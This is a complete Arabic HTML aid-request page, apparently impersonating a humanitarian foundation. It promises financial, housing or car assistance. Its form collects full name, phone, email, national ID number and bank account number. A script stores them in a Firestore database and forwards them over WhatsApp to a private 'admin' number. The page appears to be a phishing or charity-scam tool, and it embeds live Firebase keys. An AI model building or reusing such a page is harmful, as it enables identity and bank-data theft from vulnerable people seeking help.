  <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مؤسسة الوليد الإنسانية | طلب مساعدة</title>
<style>
/* نفس التنسيقات اللي عندك */
</style>
</head>
<body>
<header>
  <div class="logo"></div>
  <h1>مؤسسة الوليد الإنسانية</h1>
  <p>تقديم طلبات الدعم والمساعدة عالمياً</p>
</header>

<div style="height:50px;"></div>
<section class="support-section">
<div class="card">
<h2>ادخل بياناتك لطلب المساعدة</h2>
<div class="note">💡 قم بتسجيل بياناتك بشكل صحيح لإنشاء رقم معاملة ومتابعة الطلب.</div>

<div class="form-group"><label>الاسم الكامل:</label><input type="text" id="name"></div>
<div class="form-group"><label>رقم الجوال:</label><input type="tel" id="phone"></div>
<div class="form-group"><label>البريد الإلكتروني:</label><input type="email" id="email"></div>
<div class="form-group"><label>رقم الهوية:</label><input type="text" id="idNumber"></div>
<div class="form-group"><label>رقم الحساب البنكي:</label><input type="text" id="accountNumber"></div>
<div class="form-group"><label>الدولة:</label><input type="text" id="location"></div>
<div class="form-group"><label>نوع المساعدة:</label>
  <select id="type">
    <option value="">-- اختر النوع --</option>
    <option value="مالية">مالية</option>
    <option value="سكنية">وحدات سكنية</option>
    <option value="سيارات">سيارات</option>
    <option value="اخرى">أخرى</option>
  </select>
</div>
<div class="form-group"><label>شرح الحالة:</label><textarea id="notes" rows="4"></textarea></div>
<button id="sendBtn">إرسال الطلب</button>
<div id="result" style="margin-top:15px;color:white;"></div>
</div>
</section>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>

<script>
// إعدادات Firebase
const firebaseConfig = {
  apiKey: "AIzaSyAD7iweI5CZrKqIuzamOAqogXlGM17RxuE",
  authDomain: "order-8ed01.firebaseapp.com",
  projectId: "order-8ed01",
  storageBucket: "order-8ed01.firebasestorage.app",
  messagingSenderId: "301851488098",
  appId: "1:301851488098:web:f4b66cb6079859a789463b"
};
const app = firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const sendBtn = document.getElementById("sendBtn");
sendBtn.onclick = async function(){
  const adminPhone = "966580272758"; // رقم المسؤول

  const name = document.getElementById("name").value;
  const phone = document.getElementById("phone").value;
  const email = document.getElementById("email").value;
  const idNumber = document.getElementById("idNumber").value;
  const accountNumber = document.getElementById("accountNumber").value;
  const location = document.getElementById("location").value;
  const type = document.getElementById("type").value;
  const notes = document.getElementById("notes").value;

  if(!name || !phone || !email || !idNumber || !location || !type || !notes){
    alert("يرجى تعبئة جميع الحقول المطلوبة");
    return;
  }

  const transactionId = Math.floor(1000 + Math.random()*9000);

  // تخزين في Firestore
  await db.collection("orders").add({
    transactionId: transactionId.toString(),
    name: name,
    phoneNumber: phone,
    email: email,
    idNumber: idNumber,
    accountNumber: accountNumber,
    location: location,
    type: type,
    notes: notes,
    status: "قيد الانتظار"
  });

  // رسالة واتساب
  let message = "📌 طلب مساعدة جديد\n\n";
  message += "رقم المعاملة: "+transactionId+"\n\n";
  message += "الاسم: "+name+"\n";
  message += "الهاتف: "+phone+"\n";
  message += "البريد: "+email+"\n";
  message += "الدولة: "+location+"\n";
  message += "نوع المساعدة: "+type+"\n";
  message += "التفاصيل: "+notes;

  // فتح واتساب
  window.location.href = "https://wa.me/"+adminPhone+"?text="+encodeURIComponent(message);

  document.getElementById("result").innerText = "✅ تم إرسال الطلب وحفظه برقم المعاملة: " + transactionId;
};
</script>
</body>
</html>
